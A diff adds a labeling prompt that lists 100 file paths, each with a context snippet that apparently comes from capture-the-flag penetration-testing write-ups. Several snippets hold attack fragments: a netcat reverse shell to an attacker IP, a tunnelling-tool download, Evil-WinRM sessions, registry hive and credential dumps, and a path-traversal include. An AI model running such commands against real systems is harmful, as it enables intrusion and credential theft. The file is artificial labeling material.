@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 10/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\C2ADC3DABD0A
+   context: B3B0B2D3\BA30A33F3FC2 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\BBD2AC3ADBAF RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\C2ADC3DABD0A RW C:\Windows\SYSVOL\domain\
+2. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\CED022B22EBA
+   context: \scripts\A32FF3AEAA23\C20F1322FB3C RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\CD102CDEFD0E RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\CED022B22EBA RW C:\Windows\SYSVOL\domain\scripts\A32FF
+3. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_001
+   context: file or directory (2) [2415:2418:0309/174909.482587:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_001": No such file or director
+4. C:\Users\bob.woodadm\Documents
+   context: ins-ng 4.16 Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\bob.woodadm\Documents>
+5. /source/opt/backups
+   context: /source/opt/backups/
+6. \\primary.corp.ghost.htb\SYSVOL
+   context: 9-2733679486-179904498-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))' [*] Attempting to mount: \\primary.corp.ghost.htb\SYSVOL [*] \\primary.corp.ghost.htb\SYSVOL successfully mounted [*] Attempt
+7. /etc/tomcat9/Catalina
+   context: ewPrivileges=true CacheDirectory=tomcat9 CacheDirectoryMode=750 ProtectSystem=strict ReadWritePaths=/etc/tomcat9/Catalina/ ReadWritePaths=/var/lib/tomcat9/webapps/ ReadWritePaths=/var/log/tomcat9/  [I
+8. /tmp/airtouch_capture-01
+   context: root@AirTouch-Consultant:~# ls -l /tmp/airtouch_capture-01.* -rw-r--r-- 1 root root  64933 Apr 12 01:56 /tmp/airtouch_capture-01.cap -rw-r--r-- 1 root root
+9. C:\Users\Sara.B\Documents\WS-01
+   context: -------         ------ ---- d-----        11/4/2024  12:53 AM                WS-01 evil-winrm-py PS C:\Users\Sara.B\Documents\WS-01> ls      Directory: C:\Users\Sara.B\Documents\WS-01  Mode           
+10. C:\Users\adfs_gmsa$\Documents
+   context: 84088ff37'  Evil-WinRM shell v3.5  Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents>
+11. /content/order.txt
+   context: /content/order.txt
+12. /home/john
+   context: x:0:0:root:/root:/bin/bash michael:x:1000:1000:michael:/home/michael:/bin/bash john:x:1001:1001:,,,:/home/john:/bin/bash
+13. /usr/libexec/sssd/sssd_pac
+   context: o --uid 0 --gid 0 --logger=files 165536      4081  0.0  0.1  72648 15488 ?        S    16:05   0:00 /usr/libexec/sssd/sssd_pac --uid 0 --gid 0 --logger=files root      501922  0.0  0.1  28444 11520 ? 
+14. /default/bar/foo.php
+   context: given path and file exists it will be executed directly,               i.e. if URI is set to http://default/bar/foo.php               and bar/foo.php exists, this script will be executed without      
+15. /var/www/html/logs
+   context: www-data@moderators:/var/www/html/logs$ netstat -tnlp (Not all processes could be identified, non-owned process info  will not be shown, y
+16. C:\Windows\System32\spool\PRINTERS\
+   context: olor\*" /><FilePathCondition Path="C:\Windows\System32\spool\PRINTERS:*" /><FilePathCondition Path="C:\Windows\System32\spool\PRINTERS\*" /><FilePathCondition Path="C:\Windows\System32\spool\SERVERS:*
+17. C:\Users\0xdf\keepass-password-dumper
+   context: PS C:\Users\0xdf\keepass-password-dumper > dotnet run Z:\hackthebox\keeper-10.10.11.227\KeePassDumpFull.dmp ...[snip]... Password candidates
+18. c:\temp\mytxtfile.txt
+   context: SELECT BulkColumn  FROM OPENROWSET (BULK 'c:\temp\mytxtfile.txt', SINGLE_CLOB) MyFile
+19. /home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/authentication.py
+   context: eros auth to LDAP failed, no authentication methods left Traceback (most recent call last):   File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/authenticat
+20. /root/.pm2
+   context: in:/sbin:/bin:/snap/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin Environment=PM2_HOME=/root/.pm2 PIDFile=/root/.pm2/pm2.pid Restart=on-failure  ExecStart=/usr/local/lib/node_modules/pm2/
+21. /opt/keepass-password-dumper/bin/Debug/net7.0/keepass_password_dumper
+   context: er-10.10.11.227/KeePassDumpFull.dmp  You must install or update .NET to run this application.  App: /opt/keepass-password-dumper/bin/Debug/net7.0/keepass_password_dumper Architecture: x64 Framework: '
+22. C:\Windows\System32\wsmprovhost.exe
+   context: own  C:\Windows\explorer.exe  2016  892   wsmprovhost.exe          x64   0        HOSPITAL\drbrown  C:\Windows\System32\wsmprovhost.exe  2444  1496  powershell.exe           x64   1        HOSPITAL\dr
+23. /mailing.htb/DOWNLOAD.php
+   context: b/Instructions => http://mailing.htb/Instructions/ 200      GET        1l        5w       31c http://mailing.htb/DOWNLOAD.php 200      GET        1l        5w       31c http://mailing.htb/DownLoad.php
+24. /media/sf_CTFs/hackthebox/sweep-10.129.234.176/LansweeperDecrypt.ps1
+   context: evil-winrm-py PS C:\ProgramData> upload LansweeperDecrypt.ps1 LansweeperDecrypt.ps1 Uploading /media/sf_CTFs/hackthebox/sweep-10.129.234.176/LansweeperDecrypt.ps1: 100%|█████████████| 4.07k/4.07k [00:
+25. /MirageReports/Incident_Report_Missing_DNS_Record_nats-svc.pdf
+   context: ----------- NFS         10.10.11.78     2049   DC01.mirage.htb  4294967294 r-x      8.1MB          /MirageReports/Incident_Report_Missing_DNS_Record_nats-svc.pdf Everyone NFS         10.10.11.78     2
+26. /var/www/market/php
+   context: /var/www/market/php://filter/convert.base64-encode/resource=index.php
+27. /opt/git-dumper/git_dumper.py
+   context: oxdf@hacky$ mkdir git oxdf@hacky$ cd git/ oxdf@hacky$ /opt/git-dumper/git_dumper.py http://siteisup.htb/dev/.git/ . [-] Testing http://siteisup.htb/dev/.git/HEAD [200] [-] Testing htt
+28. /var/www/html/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active
+   context: s.php path        /var/www/html/settings.php  Drupal compatibility     on  Config storage active    /var/www/html/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active    Config storage staging   /var/
+29. /2million.htb/js/inviteapi.min.js
+   context: c http://2million.htb/home => http://2million.htb/ 200      GET        1l        8w      637c http://2million.htb/js/inviteapi.min.js      200      GET       94l      293w     4527c http://2million.ht
+30. /opt/SecLists/Usernames/cirt-default-usernames.txt
+   context: oxdf@hacky$ kerbrute userenum /opt/SecLists/Usernames/cirt-default-usernames.txt --dc dc01.manager.htb -d manager.htb      __             __               __         / /_____  ____
+31. C:\Users\edward.martin\Documents
+   context: ▌ ▄▌ v1.1.1 [*] Connecting to dc01.haze.htb:5985 as edward.martin evil-winrm-py PS C:\Users\edward.martin\Documents> cd ..\Desktop evil-winrm-py PS C:\Users\edward.martin\Desktop> type user.txt 24bcc3
+32. /root/TeamCity/webapps/ROOT/WEB-INF/lib/idea-obsolete-openapi.jar
+   context: TeamCity/webapps/ROOT/WEB-INF/lib/log4j-core.jar:/root/TeamCity/webapps/ROOT/WEB-INF/lib/common.jar:/root/TeamCity/webapps/ROOT/WEB-INF/lib/idea-obsolete-openapi.jar -Dlogs.dir=/root/TeamCity/logs -Xm
+33. C:\Users\justin.bradley\Documents
+   context: iop1234$$'  Evil-WinRM shell v3.5  Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\justin.bradley\Documents>
+34. /soulmate.htb/assets/css/style.css
+   context: 488w     8554c http://soulmate.htb/login.php 200      GET      473l      932w     8657c http://soulmate.htb/assets/css/style.css 200      GET      238l      611w    11107c http://soulmate.htb/register
+35. C:\programdata\backup
+   context: evil-winrm-py PS C:\programdata> diskshadow /s C:\programdata\backup Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer:  BABYDC,  9/
+36. /var/www/.config/google-chrome-for-testing/Default/Web
+   context: l Google Chrome build. [2385:2406:0309/174908.532088:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.config/google-chrome-for-testing/Default/Web Applications/Logs/WebAppInstallManager.log": 
+37. C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
+   context: ownload C8D69EBE9A43E9DEBF6B5FBD48B521B9                                          Info: Downloading C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D6
+38. /opt/bitnami/apache/conf.default
+   context: WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain WORDPRESS_DATABASE_SSL_KEY_FILE= APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default WORDPRESS_LOGGED_IN_KEY= APACHE_CONF_DIR=/opt/bitnami/apache/conf H
+39. C:\ProgramData\Windows_Server_2022_Datacenter
+   context: _Datacenter                                                                     FullName          : C:\ProgramData\Windows_Server_2022_Datacenter                                                      P
+40. /root/TeamCity/buildAgent/lib/common-vcs.jar
+   context: ons-logging.jar:/root/TeamCity/buildAgent/lib/log4j-api.jar:/root/TeamCity/buildAgent/lib/utils.jar:/root/TeamCity/buildAgent/lib/common-vcs.jar:/root/TeamCity/buildAgent/lib/common-config.jar:/root/T
+41. C:\Users\sflowers\desktop
+   context: *Evil-WinRM* PS C:\Users\sflowers\desktop> cat user.txt c107c589************************
+42. C:\Windows\Tasks\Uploads
+   context: C:\Windows\Tasks\Uploads
+43. /actions/action_handler.php
+   context: $ find . -path ./.git -prune -o -type f -print ./includes/coming_soon.html ./utils.php ./index.php ./actions/action_handler.php ./actions/image2pdf.php ./assets/img/forestbridge.jpg ./.gitignore ./scr
+44. /opt/maltrail
+   context: $ script /dev/null -c bash Script started, file is /dev/null puma@sau:/opt/maltrail$ ^Z [1]+  Stopped                 nc -lnvp 443 oxdf@hacky$ stty raw -echo; fg nc -lnvp 443
+45. /root/TeamCity/webapps/ROOT/WEB-INF/lib/log4j-1.2-api.jar
+   context: :/root/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-connector-basic-1.6.3.jar:/root/TeamCity/webapps/ROOT/WEB-INF/lib/log4j-1.2-api.jar:/root/TeamCity/webapps/ROOT/WEB-INF/plugin
+46. /root/TeamCity/buildAgent/lib/spring-jdbc.jar
+   context: s-httpclient.jar:/root/TeamCity/buildAgent/lib/stax2-api.jar:/root/TeamCity/buildAgent/lib/gson.jar:/root/TeamCity/buildAgent/lib/spring-jdbc.jar:/root/TeamCity/buildAgent/lib/httpcore.jar:/root/TeamC
+47. \\.\pipe\2f3dba63-0053-4f1d-a4c1-1da79f12d463\pipe\epmapper
+   context: 8271354688 [*] UseProtseqFunctionParamCount: 6 [*] HookRPC [*] Start PipeServer [*] CreateNamedPipe \\.\pipe\2f3dba63-0053-4f1d-a4c1-1da79f12d463\pipe\epmapper [*] Trigger RPCSS [*] DCOM obj GUID: 000
+48. /home/tobias
+   context: nocturnal:~$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash tobias:x:1000:1000:tobias:/home/tobias:/bin/bash ispapps:x:1001:1002::/var/www/apps:/bin/sh ispconfig:x:1002:1003::/usr/local/
+49. C:\Users\jeremy.combs\Documents
+   context: Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\jeremy.combs\Documents>
+50. /etc/cloud/cloud.cfg.d/99-installer.cfg
+   context: g /var/log/syslog /var/log/cloud-init-output.log /var/log/auth.log /var/spool/rsyslog /etc/hostname /etc/cloud/cloud.cfg.d/99-installer.cfg /etc/cloud/ds-identify.cfg /etc/hosts
+51. /giveback.htb/wp-content/themes/bizberg/readme.txt
+   context: | Latest Version: 4.2.9.79 (up to date)  | Last Updated: 2024-06-09T00:00:00.000Z  | Readme: http://giveback.htb/wp-content/themes/bizberg/readme.txt  | Style URL: http://giveback.htb/wp-content/theme
+52. C:\Users\kioskUser0\Downloads\BulletsPassView.exe
+   context: ully.  PS C:\> copy \\10.10.14.79\share\BulletsPassView.exe C:\Users\kioskUser0\Downloads\  PS C:\> C:\Users\kioskUser0\Downloads\BulletsPassView.exe
+53. c:\programdata\nc64.exe
+   context: inRM* PS C:\programdata> .\sw.exe create /payload:"C:\programdata\ps.exe" /args:" -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445" /title:"CVE-2022-30190"   ____  _                
+54. /home/ben
+   context: w-data@soulmate:/$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash ben:x:1000:1000:,,,:/home/ben:/bin/bash
+55. /tmp/c
+   context: wget http://10.10.14.6/chisel_1.8.1_linux_amd64 -O /tmp/c
+56. C:\Windows\Logs\DISM\dism.log
+   context: InitializeInternal 2025-05-16 23:05:23, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log 2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=36
+57. /var/www/html/backdrop/index.php
+   context: $?" != 0 ]]; then         #something went wrong.  restoring from backup.         cp /root/index.php /var/www/html/backdrop/index.php fi
+58. /home/user/my_docs
+   context: YPTED archive.       Examples:         - Encrypted with file-specific password:           backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p <file_password> --verbose --type ta
+59. /usr/local/nagiosxi/scripts/components/autodiscover_new.php
+   context: /npcd reload     (root) NOPASSWD: /etc/init.d/npcd status     (root) NOPASSWD: /usr/bin/php         /usr/local/nagiosxi/scripts/components/autodiscover_new.php *     (root) NOPASSWD: /usr/bin/php /usr
+60. /var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ
+   context: e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged type overlay (rw,relatime,lower dir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE
+61. /root/psk/hostapd_other2.conf
+   context: her1.conf > /var/log/hostapd_other1.log &  ip addr add $IP_OTHER2.1/24 dev $WLAN_OTHER2 hostapd_aps /root/psk/hostapd_other2.conf > /var/log/hostapd_other2.log &  ip addr add $IP_OTHER3.1/24 dev $WLAN
+62. \\.\pipe\4cd81785-115a-4f09-a002-42257d13f6ac\pipe\epmapper
+   context: ProtseqFunctionParamCount: 6 [*] HookRPC [*] Start PipeServer [*] Trigger RPCSS [*] CreateNamedPipe \\.\pipe\4cd81785-115a-4f09-a002-42257d13f6ac\pipe\epmapper [*] DCOM obj GUID: 00000000-0000-0000-c0
+63. /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug
+   context: r/lib/postfix/sbin/master) Reading symbols from /lib64/ld-linux-x86-64.so.2... Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug... 0x00007f96ea034467 in _s
+64. /usr/local/investigation/Windows
+   context: www-data@investigation:/$ find / -user smorton 2>/dev/null /home/smorton /usr/local/investigation/Windows Event Logs for Analysis.msg
+65. /var/www/private/leave_requests.csv
+   context: ser) {     return res.status(500).send("Bad character detected.")   }    exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, std
+66. /root/.docker/buildx/.lockConnection
+   context: xdf@hacky$ nc -lvnkp 3310 Listening on 0.0.0.0 3310 Connection received on 10.10.11.223 35118 zSCAN /root/.docker/buildx/.lockConnection received on 10.10.11.223 35126 zSCAN /root/.docker/buildx/curre
+67. /var/cache/pacman/pkg/file-5.45-1-x86_64.pkg.tar.zst
+   context: [paul@blockblock shm]$ sudo pacman -U /var/cache/pacman/pkg/file-5.45-1-x86_64.pkg.tar.zst --hookdir /dev/shm loading packages... warning: file-5.45-1 is up to date -- reinstalling resolving
+68. /usr/local
+   context: ig_metrics_registry=https://registry.npmjs.org/ LOGNAME=dev JOURNAL_STREAM=8:6217 npm_config_prefix=/usr/local npm_config_cache=/home/dev/.npm npm_config_node_gyp=/usr/share/nodejs/node-gyp/bin/node-g
+69. /opt/SecLists/Discovery/Web-Content/spring-boot.txt
+   context: oxdf@hacky$ feroxbuster -u http://10.129.11.207:8080 -w /opt/SecLists/Discovery/Web-Content/spring-boot.txt    ___  ___  __   __     __      __         __   ___ |__  |__  |__) |__) | /  `    /  \ \_/ 
+70. C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+   context: Condition Path="C:\Windows\System32\Microsoft\Crypto\DSS\MachineKeys:\*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys:*" /><FilePathCondition Path="C:\Windows\System
+71. /lib/x86_64-linux-gnu/libcrypto.so.3
+   context: YWRITE, 54, 0x9c000) = 0x758f3b4c1000 close(54)                               = 0 openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libcrypto.so.3", O_RDONLY|O_CLOEXEC) = 54 read(54, "\177ELF\2\1\1\0\0\0\0\0\0\
+72. C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
+   context: PS C:\Users\PPotts> gci -force AppData\Roaming\Microsoft\Credentials      Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials  Mode                 LastWriteTime         Length Name
+73. /share/nmap
+   context: ers\user). This is followed by the location of the nmap executable     and the same location with ../share/nmap appended. Then a compiled-in location such as     /usr/local/share/nmap or /usr/share/nm
+74. /file.era.htb/security_login.php
+   context: oxdf@hacky$ curl -s -d 'username=0xdf&answer1=0xdf&answer2=0xdf&answer3=0xsdf' 'http://file.era.htb/security_login.php' | grep "User not found." oxdf@hacky$ curl -s -d 'username=not_a_user&answer1=0xd
+75. /root/examples
+   context: /root/examples
+76. /opt/chisel/chisel_1.10.0_linux_amd64
+   context: oxdf@hacky$ /opt/chisel/chisel_1.10.0_linux_amd64 server -p 8000 --reverse 2026/04/09 20:41:25 server: Reverse tunnelling enabled 2026/04/09 20:41:25
+77. C:\windows\temp\\SECURITY.save
+   context: ows\temp\\SAM.save [*] Saved HKLM\SYSTEM to C:\windows\temp\\SYSTEM.save [*] Saved HKLM\SECURITY to C:\windows\temp\\SECURITY.save
+78. C:\Users\0xdf\Desktop\reaper
+   context: .0.19045.3693] (c) Microsoft Corporation. All rights reserved.  FLARE-VM Sat 08/23/2025  8:18:50.36 C:\Users\0xdf\Desktop\reaper>
+79. /dev.pov.htb/default.aspx
+   context: /portfolio/style library 302      GET        3l        8w      149c http://dev.pov.htb/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/con 302      GET        3l        8w      154c http://dev.p
+80. /tmp/airtouch-internet.conf
+   context: root@AirTouch-Consultant:~# wpa_passphrase AirTouch-Internet 'challenge' > /tmp/airtouch-internet.conf root@AirTouch-Consultant:~# cat /tmp/airtouch-internet.conf network={         ssid="AirTouch-Inte
+81. /furni.htb/static/css/tiny-slider.css
+   context: 1201c http://furni.htb/static/images/support.svg 200      GET        3l       50w     2177c http://furni.htb/static/css/tiny-slider.css 200      GET       73l      157w     1809c http://furni.htb/stat
+82. C:\Users\Raven
+   context: *Evil-WinRM* PS C:\Users\Raven> ls -recurse .      Directory: C:\Users\Raven  Mode                LastWriteTime         Length Nam
+83. /usr/local/lib/python3.8/dist-packages/sklearn/base.py
+   context: 02, in _validate_X_predict     X = self._validate_data(X, dtype=DTYPE, accept_sparse="csr",   File "/usr/local/lib/python3.8/dist-packages/sklearn/base.py", line 421, in _validate_data     X = check_a
+84. /lecturer/notices/create.php
+   context: POST /lecturer/notices/create.php HTTP/1.1 Host: portal.guardian.htb User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Ge
+85. /cat.htb/img/cat1.jpg
+   context: l      715w    53503c http://cat.htb/img/cat3.webp 200      GET      304l     1647w   132808c http://cat.htb/img/cat1.jpg 200      GET      904l     5604w   448419c http://cat.htb/img/cat2.png 301    
+86. /var/lib/ghost/content
+   context: ging": {     "transports": ["stdout"]   },   "process": "systemd",   "paths": {     "contentPath": "/var/lib/ghost/content"   },   "spam": {     "user_login": {         "minWait": 1,         "maxWait"
+87. C:\Users\michael\Documents
+   context: 0xdf0xdf.  Evil-WinRM shell v3.5  Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\michael\Documents>
+88. /blog.bigbang.htb/wp-cron.php
+   context: ess (Aggressive Detection)  | Confidence: 100%  [+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 60%  
+89. /tmp/0xdf.tar.gz
+   context: ofbiz@bizness:/opt/ofbiz/runtime/data$ tar -czf /tmp/0xdf.tar.gz derby
+90. /var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
+   context: er/overlay2/c41d5854e43bd996e128d647cb526b 73d04c9ad6325201c85f73fdba372cb2f1/work,xino=off) shm on /var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/s
+91. C:\Users\Administrator\Docume
+   context: ------- CleanupScript                                     Administrator   powershell.exe -File "C:\Users\Administrator\Docume... HTB-Stability                                     SYSTEM          C:\Us
+92. /home/tom_summers_admin
+   context: sr/bin/bash tom_summers:x:2001:2001::/home/tom_summers:/usr/bin/bash tom_summers_admin:x:2002:2002::/home/tom_summers_admin:/usr/bin/bash rebecca_smith:x:2003:2003::/home/rebecca_smith:/usr/bin/bash
+93. /opt/share
+   context: netadmin@wifinetic:/opt$ ls share netadmin@wifinetic:/opt$ cd share/ netadmin@wifinetic:/opt/share$ ls backup-OpenWrt-2023-07-26.tar  MigrateOpenWrt.txt         ProjectOpenWRT.pdf employees_wellness
+94. /home/mark/confs/../../../root/root.txt
+   context: fs$ cat 0xdf.conf  LoadModule mpm_worker_module /usr/lib/apache2/modules/mod_mpm_worker.so  Include /home/mark/confs/../../../root/root.txt mark@guardian:~/confs$ sudo safeapache2ctl -f ./0xdf.conf  A
+95. /opt/playbooks
+   context: /opt/playbooks
+96. C:\Windows
+   context: 5:24, Info                  DISM   DISM OS Provider: PID=3316 TID=2288 Defaulting Windows folder to C:\Windows - CDISMOSServiceManager::Final_OnConnect 2025-05-16 23:05:24, Info                  DISM 
+97. C:\windows\temp\\SAM.save
+   context: [!] Cannot check RemoteRegistry status. Triggering start trough named pipe... [*] Saved HKLM\SAM to C:\windows\temp\\SAM.save [*] Saved HKLM\SYSTEM to C:\windows\temp\\SYSTEM.save [*] Saved HKLM\SECUR
+98. \\update.msu\r\ndel
+   context: cu/2024/06/windows10.0-kb5039217-x64_bc72f4ed75c6dd7bf033b823f79533d5772769a3.msu -O update.msu\r\n.\\update.msu\r\ndel .\\update.msu\r\ndir\r\niwr https://catalog.s.download/windowsupdate.com/c/msdow
+99. C:\Users\drbrown.HOSPITAL\Documents
+   context: cky$ rlwrap -cAr nc -lnvp 443 Listening on 0.0.0.0 443 Connection received on 10.10.11.241 6102  PS C:\Users\drbrown.HOSPITAL\Documents> whoami hospital\drbrown
+100. /var/www/html/gavel
+   context: /var/www/html/gavel
